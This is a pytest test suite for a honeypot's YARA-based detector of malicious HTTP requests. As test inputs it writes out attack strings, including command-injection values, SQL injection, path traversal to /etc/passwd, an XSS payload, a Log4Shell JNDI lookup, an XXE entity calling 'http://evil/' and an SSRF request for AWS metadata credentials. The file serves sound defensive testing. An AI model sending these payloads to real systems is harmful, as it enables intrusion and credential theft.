from pathlib import Path

import pytest

from detection import (
    DetectionCoordinator,
    YaraDetectionEngine,
)

RULES = Path(__file__).resolve().parent.parent / "rules"


def test_yara_scans_fields_and_preserves_multiple_categories():
    detector = DetectionCoordinator(YaraDetectionEngine(RULES))

    findings = detector.scan_request(
        path="/wp-admin",
        body="q=' UNION SELECT password FROM users--",
        user_agent="sqlmap/1.8",
        method="POST",
    )

    by_type = {finding.attack_type: finding for finding in findings}
    assert set(by_type) == {
        "common_probes",
        "scanner_user_agent",
        "sql_injection",
    }
    assert by_type["sql_injection"].scan_target == "body"
    assert by_type["sql_injection"].matched_pattern.lower() == "union select"
    assert by_type["scanner_user_agent"].classification == "suspicious"


def test_yara_rejects_missing_required_metadata(tmp_path):
    (tmp_path / "invalid.yar").write_text(
        'rule invalid { strings: $a = "metadata-validation" condition: $a }',
        encoding="utf-8",
    )

    with pytest.raises(RuntimeError, match="missing metadata"):
        YaraDetectionEngine(tmp_path)


def test_login_rule_requires_post():
    detector = DetectionCoordinator(YaraDetectionEngine(RULES))

    get_types = {
        item.attack_type
        for item in detector.scan_request(path="/admin/login", method="GET")
    }
    post_types = {
        item.attack_type
        for item in detector.scan_request(path="/admin/login", method="POST")
    }

    assert "login_attempt" not in get_types
    assert "login_attempt" in post_types


def _yara():
    return DetectionCoordinator(YaraDetectionEngine(RULES))


def _bundled_catalog():
    from responses import ResponseCatalog

    return ResponseCatalog.load(RULES.parent / "responses")


def test_xxe_response_wins_over_command_injection():
    body = '<!DOCTYPE r [<!ENTITY x SYSTEM "http://evil/?a=1&&id">]><r>&x;</r>'
    findings = _yara().scan_request(path="/api", body=body, method="POST")

    reply = _bundled_catalog().select(findings, "POST", "/api", "")

    assert reply.response_type == "xxe_injection"
    assert reply.content_type == "application/xml"


@pytest.mark.parametrize(
    "fields",
    [
        {"query": "host=example.com"},
        {"query": "ping=8.8.8.8"},
        {"query": "q=how+to+use+curl"},
        {"query": "filter=a&&b=2"},
        {"path": "/docs/.github/workflows"},
        {"path": "/blog/environment-setup"},
        {"body": "author name=x", "method": "POST"},
        {"body": "comment=I waited for hours=long", "method": "POST"},
        {"body": "msg=wait... ok", "method": "POST"},
        {"body": "comment=nice <img src=cat.png>", "method": "POST"},
        {"body": "<!DOCTYPE html><html></html>", "method": "POST"},
        {"query": "q=(&) and *) chars"},
    ],
)
def test_yara_ignores_benign_requests(fields):
    findings = _yara().scan_request(**fields)

    assert [item.attack_type for item in findings] == []


@pytest.mark.parametrize(
    "fields, attack_type",
    [
        ({"query": "q=1;id"}, "command_injection"),
        ({"query": "host=127.0.0.1|cat /etc/hosts"}, "command_injection"),
        ({"query": "a=`id`"}, "command_injection"),
        ({"query": "a=$(whoami)"}, "command_injection"),
        ({"query": "a=1&&uname -a"}, "command_injection"),
        ({"query": "cmd=ls"}, "command_injection"),
        ({"query": "id=1'+OR+'1'='1"}, "sql_injection"),
        ({"query": "id=1 and 1=1"}, "sql_injection"),
        ({"query": "id=1'--"}, "sql_injection"),
        ({"query": "id=1;drop table users"}, "sql_injection"),
        ({"path": "/%2e%2e/%2e%2e/etc/hosts"}, "path_traversal"),
        ({"query": "file=..%5c..%5cboot.ini"}, "path_traversal"),
        ({"path": "/.git/config"}, "common_probes"),
        ({"path": "/.env"}, "common_probes"),
        ({"query": "q=<img src=x onerror=alert(1)>"}, "xss_attempt"),
        ({"query": "user=*)(uid=*))(|(uid=*"}, "ldap_injection"),
        ({"path": "/sign-in", "method": "POST"}, "login_attempt"),
        (
            {"path": "/index.php", "query": "action=login", "method": "POST"},
            "login_attempt",
        ),
        ({"user_agent": "Mozilla/5.00 (Nikto/2.1.6)"}, "scanner_user_agent"),
        ({"user_agent": "WPScan v3.8"}, "scanner_user_agent"),
    ],
)
def test_yara_detects_attacks(fields, attack_type):
    findings = _yara().scan_request(**fields)

    assert attack_type in {item.attack_type for item in findings}


def test_yara_rejects_non_integer_severity(tmp_path):
    (tmp_path / "bad.yar").write_text(
        'rule bad { meta: attack_type = "x" classification = "attack" '
        'severity = "high" strings: $a = "bad" condition: $a }',
        encoding="utf-8",
    )

    with pytest.raises(RuntimeError, match="severity"):
        YaraDetectionEngine(tmp_path)


class _CountingDetector:
    def __init__(self):
        self.calls = 0

    def scan_request(self, **kwargs):
        self.calls += 1
        return []


def test_request_is_scanned_once_across_middleware_and_honeypot():
    import asyncio
    from types import SimpleNamespace

    from starlette.requests import Request

    from middleware.deception import DeceptionMiddleware
    from routes.honeypot import _track_honeypot_request

    detector = _CountingDetector()
    tracker = SimpleNamespace(detector=detector, is_honeypot_path=lambda path: False)
    state = SimpleNamespace(
        config=SimpleNamespace(dashboard_secret_path="secret"),  # noqa: S106
        tracker=tracker,
    )
    request = Request(
        {
            "type": "http",
            "method": "GET",
            "path": "/products",
            "headers": [],
            "query_string": b"page=2",
            "client": ("203.0.113.9", 1234),
            "app": SimpleNamespace(state=state),
        }
    )

    async def downstream(request):
        await _track_honeypot_request(request)
        from starlette.responses import Response

        return Response(status_code=200)

    asyncio.run(DeceptionMiddleware(None).dispatch(request, downstream))

    assert detector.calls == 1


# --- Header and cookie scanning -------------------------------------------

LOG4SHELL = "${jndi:ldap://203.0.113.5/a}"


def test_headers_are_scanned_and_reported_as_header_target():
    findings = _yara().scan_request(
        path="/", headers=[("x-api-version", LOG4SHELL), ("accept", "text/html")]
    )

    assert [(f.attack_type, f.scan_target) for f in findings] == [
        ("log4shell", "header")
    ]


def test_header_value_is_url_decoded_once():
    encoded = "%24%7Bjndi%3Aldap%3A%2F%2F203.0.113.5%2Fa%7D"

    findings = _yara().scan_request(headers=[("x-forwarded-host", encoded)])

    assert [f.attack_type for f in findings] == ["log4shell"]


def test_user_agent_header_is_not_scanned_twice_as_a_header():
    findings = _yara().scan_request(headers=[("user-agent", LOG4SHELL)])

    assert findings == []


def test_header_name_is_exposed_to_rules(tmp_path):
    (tmp_path / "hdr.yar").write_text(
        'rule krawl_test_header { meta: attack_type = "hdr_test" '
        'classification = "attack" severity = 5 '
        'strings: $a = "needle-text" '
        'condition: scan_target == "header" and header_name == "x-test" and $a }',
        encoding="utf-8",
    )
    detector = DetectionCoordinator(YaraDetectionEngine(tmp_path))

    hit = detector.scan_request(headers=[("x-test", "needle-text")])
    miss = detector.scan_request(headers=[("x-other", "needle-text")])
    other_target = detector.scan_request(query="needle-text")

    assert [f.attack_type for f in hit] == ["hdr_test"]
    assert miss == []
    assert other_target == []


@pytest.mark.parametrize(
    "headers",
    [
        [("cookie", "session=abc123; id=5; theme=dark")],
        [("cookie", "a=1; cmd=ls; q=1&&b=2")],
        [("accept", "text/html,application/xhtml+xml;q=0.9,*/*;q=0.8")],
        [("referer", "https://example.com/search?q=union+of+states&page=2")],
        [("accept-language", "en-US,en;q=0.9")],
        [("authorization", "Bearer abc.def.ghi")],
    ],
)
def test_generic_rules_do_not_scan_headers(headers):
    assert _yara().scan_request(path="/", headers=headers) == []


def test_header_scan_is_capped_by_count_and_size():
    many = [(f"x-h{i}", "ok") for i in range(64)] + [("x-late", LOG4SHELL)]
    huge = [("x-huge", "a" * 9000 + LOG4SHELL)]

    assert _yara().scan_request(headers=many) == []
    assert _yara().scan_request(headers=huge) == []


def test_honeypot_fallback_scan_passes_headers():
    import asyncio
    from types import SimpleNamespace

    from starlette.requests import Request

    from routes.honeypot import _track_honeypot_request

    seen = {}

    class Detector:
        def scan_request(self, **kwargs):
            seen.update(kwargs)
            return []

    state = SimpleNamespace(
        tracker=SimpleNamespace(detector=Detector(), is_honeypot_path=lambda p: False)
    )
    request = Request(
        {
            "type": "http",
            "method": "GET",
            "path": "/",
            "headers": [(b"x-test", b"1")],
            "query_string": b"",
            "client": ("203.0.113.9", 1234),
            "app": SimpleNamespace(state=state),
        }
    )

    asyncio.run(_track_honeypot_request(request))

    assert list(seen["headers"]) == [("x-test", "1")]


def test_iter_findings_keeps_lower_severity_duplicates_of_one_attack_type(tmp_path):
    (tmp_path / "two.yar").write_text(
        'rule krawl_test_low { meta: attack_type = "dup" classification = "attack" '
        'severity = 2 strings: $a = "needle-text" condition: $a }\n'
        'rule krawl_test_high { meta: attack_type = "dup" classification = "attack" '
        'severity = 6 strings: $a = "needle-text" condition: $a }',
        encoding="utf-8",
    )
    detector = DetectionCoordinator(YaraDetectionEngine(tmp_path))

    raw = list(detector.iter_findings(query="q=needle-text"))
    kept = detector.scan_request(query="q=needle-text")

    assert {f.rule_name for f in raw} == {"krawl_test_low", "krawl_test_high"}
    assert [f.rule_name for f in kept] == ["krawl_test_high"]


def test_scan_inputs_lists_every_decoded_variant_with_its_target():
    inputs = list(
        _yara().scan_inputs(path="/a%2520b", query="q=a+b", headers=[("X-Y", "v")])
    )

    assert ("path", "", "/a%2520b") in inputs
    assert ("path", "", "/a%20b") in inputs
    assert ("path", "", "/a b") in inputs
    assert ("query", "", "q=a b") in inputs
    assert ("header", "x-y", "v") in inputs


# --- Matched string identifiers (declarative responses) --------------------


def test_finding_lists_every_matched_string_id():
    [finding] = [
        f
        for f in _yara().iter_findings(path="/../etc/passwd")
        if f.rule_name == "krawl_path_traversal"
    ]

    assert finding.pattern_ids == ("$parent", "$passwd")


def test_declared_string_ids_reads_rule_sources():
    from detection import declared_string_ids

    ids = declared_string_ids(RULES)

    assert {"$parent", "$passwd", "$shadow"} <= ids["krawl_path_traversal"]


def test_engine_exposes_rule_strings_and_response_types():
    engine = YaraDetectionEngine(RULES)

    assert "$passwd" in engine.rule_strings["krawl_path_traversal"]
    assert engine.rule_response_types["krawl_path_traversal"] == "path_traversal"
    assert "krawl_common_probes" not in engine.rule_response_types


def test_response_type_is_only_checked_when_known_types_are_given(tmp_path):
    (tmp_path / "r.yar").write_text(
        'rule krawl_t { meta: attack_type = "t" classification = "attack" '
        'severity = 5 response_type = "nope" '
        'strings: $a = "needle-text" condition: $a }',
        encoding="utf-8",
    )

    YaraDetectionEngine(tmp_path)
    with pytest.raises(RuntimeError, match="response_type"):
        YaraDetectionEngine(tmp_path, known_response_types={"other"})


def _catalogue_without(tmp_path, missing):
    """A copy of the bundled catalogue with one response type removed."""
    import shutil

    import yaml

    shutil.copytree(
        Path(__file__).resolve().parent.parent / "responses", tmp_path / "r"
    )
    manifest = tmp_path / "r" / "manifest.yaml"
    data = yaml.safe_load(manifest.read_text())
    del data["responses"][missing]
    manifest.write_text(yaml.safe_dump(data, sort_keys=False))
    return tmp_path / "r"


def _startup_config(responses_path):
    from types import SimpleNamespace

    return SimpleNamespace(yara_rules_path="rules", responses_path=str(responses_path))


def test_startup_fails_when_a_rule_names_a_type_missing_from_the_catalogue(tmp_path):
    from detection import initialize_detection

    config = _startup_config(_catalogue_without(tmp_path, "path_traversal"))

    with pytest.raises(RuntimeError, match="path_traversal"):
        initialize_detection(config)


def test_startup_loads_the_bundled_catalogue():
    from detection import get_response_catalog, initialize_detection

    initialize_detection(_startup_config("responses"))

    assert "path_traversal" in get_response_catalog().response_types


def test_scan_request_keeps_string_ids_from_every_decoded_variant():
    # The raw query only matches $aws; the decoded one also matches the selector.
    query = (
        "url=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2Fiam"
        "%2Fsecurity-credentials%2Fweb-role"
    )

    [finding] = [
        f
        for f in _yara().scan_request(path="/fetch", query=query)
        if f.rule_name == "krawl_ssrf"
    ]

    assert "$sel_aws_creds" in finding.pattern_ids
    assert finding.pattern_ids[0] == "$aws"


@pytest.mark.parametrize("engine", ["legacy_json", "hybrid", "yara"])
def test_leftover_engine_key_is_ignored(tmp_path, monkeypatch, engine):
    # Configs from before YARA-only detection may still set detection.engine.
    from config import Config

    config_file = tmp_path / "config.yaml"
    config_file.write_text(f"detection:\n  engine: {engine}\n", encoding="utf-8")
    monkeypatch.setenv("CONFIG_LOCATION", str(config_file))

    assert Config.from_yaml().yara_rules_path == "rules"


@pytest.mark.parametrize(
    "body",
    [
        # Field orders seen on the demo; baseline rules once matched wp-submit.
        "log=r.duffy&password=r.duffy1&pwd=r.duffy1&redirect_to=%2Fwp-admin%2F"
        "&testcookie=1&wp-submit=Log+In",
        "log=jdoe&pwd=jdoe1&wp-submit=Log+In"
        "&redirect_to=https%3A%2F%2Fexample.com%2Fwp-admin%2F&testcookie=1",
        # Once matched CVE-2023-33338 on password=password.
        "log=jdoe&password=password&pwd=password&redirect_to=%2Fwp-admin%2F"
        "&testcookie=1&wp-submit=Log+In",
    ],
)
def test_wordpress_login_form_is_only_a_login_attempt(body):
    findings = _yara().iter_findings(method="POST", path="/wp-login.php", body=body)

    assert {f.rule_name for f in findings} == {"krawl_login_attempt"}


def test_detection_has_no_legacy_engine():
    import detection

    assert not hasattr(detection, "LegacyDetectionEngine")
    assert not hasattr(detection, "LEGACY_RULE_META")
